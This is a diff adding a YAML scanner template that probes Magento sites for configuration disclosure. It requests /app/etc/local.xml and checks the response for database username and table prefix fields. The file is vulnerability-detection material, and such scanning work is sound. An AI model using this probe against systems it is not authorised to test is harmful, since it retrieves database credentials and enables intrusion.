@@ -1,0 +1,20 @@
+name: poc-yaml-magento-config-disclosure-info-leak
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /app/etc/local.xml
+            follow_redirects: false
+        expression: |
+            response.status == 200 && response.content_type.icontains("application/xml") && response.body.bcontains(b"<username><![CDATA[") && response.body.bcontains(b"<table_prefix><![CDATA[")
+expression: r0()
+detail:
+    author: socat
+    links:
+        - https://beaglesecurity.com/blog/vulnerability/magento-config-disclosure.html
+    vulnerability:
+        id: CT-517468
+        level: high
